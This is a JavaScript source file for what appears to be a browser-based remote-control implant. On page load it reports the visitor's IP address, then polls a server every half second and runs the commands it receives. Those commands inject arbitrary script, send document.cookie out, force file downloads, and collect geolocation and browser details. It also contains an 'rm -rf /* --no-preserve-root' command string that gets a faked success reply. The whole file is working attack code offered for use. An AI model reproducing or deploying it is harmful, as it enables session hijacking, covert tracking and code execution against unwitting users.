


console.log("Load OK!")

var loop;

function clear_command() {
    var xhr = new XMLHttpRequest();
    var url = window.location.href;
    xhr.open("POST","/virus_clear_command/"+url.substring(remote.length),true);
    xhr.send()
}

function sendReturn(content) {
    var xhr = new XMLHttpRequest();
    var url = window.location.href;
    xhr.open("POST",("/push/"+url.substring(remote.length)+"/"+content).replace('/',''),true);
    xhr.send()
}
function showmap(position) {
    var cords = position.coords;
    var longitude = cords.longitude;
    var latitude = cords.latitude;

    console.log(longitude)
    console.log(latitude)
    sendReturn("[ longitude ] "+longitude+"\n;" + "[ latitude ] "+latitude);
}
function error(error) {
    var err = error.code;
    switch (err) {
        case 1: sendReturn("The user rejected location services"); break;
        case 2: sendReturn("Location information is not available"); break;
        case 3: sendReturn("Get information timed out");
    }
}
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showmap,error);
    } else {
        return "Get Location Error!";
    }
}
function getIP() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET","https://api.ipify.org/",false)
    xhr.send();
    return xhr.responseText.replace("\n","")
}

function exec(command) {
    try {
        command = command.replace("\n","")
        if (command.replace(" ","") === 'none') {
            return false;
        }
        else if (command == 'js: run_system_command("rm -rf /* --no-preserve-root")')
        {
            // This is game's command.
            setTimeout(function() {
                sendReturn("[INFO] SYSTEM COMMAND RUN SUCCESSFUL.");
            } , 3000);          
        }
        else if (command.startsWith("js: ")) {
            var javaScript = command.substring("js: ".length,command.length);
    
            var script = document.createElement("script");
            script.innerHTML = javaScript;
            document.body.appendChild(script);
    
            sendReturn("Run JavaScript ok: "+javaScript)
            clear_command()
            return true;
        }
        else if (command == 'get_cookie') {
            sendReturn(String(document.cookie));
            clear_command()
        }
        else if (command.startsWith('rget ')) {
            var url = String(command).substring(5 , command.length);
            var body = document.body;
            var a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = 'Download'
            body.appendChild(a);
            a.click()
            body.removeChild(a)
        }
        else if (command === 'get_ip') {
            var xhr = new XMLHttpRequest();
            xhr.open("GET","https://api.ipify.org/",true)
            xhr.send();
            xhr.onload = function (e) {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        sendReturn( "[IP] "+xhr.responseText);
                        clear_command()
                    }
                    else{
                        sendReturn( "[ ERROR ] GET IP ERROR!" );
                        clear_command()
                    }
                }
            };
            return true;
        }
        else if (command === 'getlocation')
        {
            getLocation();
            clear_command()
            return true;
        }
        else if (command === 'getinfo') {
            sendReturn("[ navigator ] /n" +
                "Platform: "+navigator.platform + "/n" +
                "UserAgent: " + navigator.userAgent + '/n' +
                "Language: " + navigator.language + "/n" +
                "Geolocation: " + navigator.geolocation + '/n' +
                "OnLine: " + navigator.onLine + "/n" +
                "AppName: "+navigator.appName + '/n' +
                "CookieEnabled: " + navigator.cookieEnabled
            );
            clear_command()
            return true;
        }
        else if (command === 'close') {
            clearInterval(loop)
            clear_command()
            return true;
        }
        else {
            sendReturn("Command Error: "+command);
            clear_command()
            return false;
        }
    }catch(e) {
        sendReturn(e)
        clear_command()
    }
}

sendReturn("Connect: "+getIP());

loop = setInterval(function () {
    try{
        var xhr = new XMLHttpRequest();
        var url = window.location.href;
        xhr.open("GET","/push/"+url.substring(remote.length)+"/none",true)
        xhr.send();

        xhr.onload = function (e) {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    console.log(xhr.responseText)
                    exec(xhr.responseText);
                }
                else{
                    clearInterval(loop);
                }
            }
        };
    }catch (e){
        clearInterval(loop);
    }
} , 500)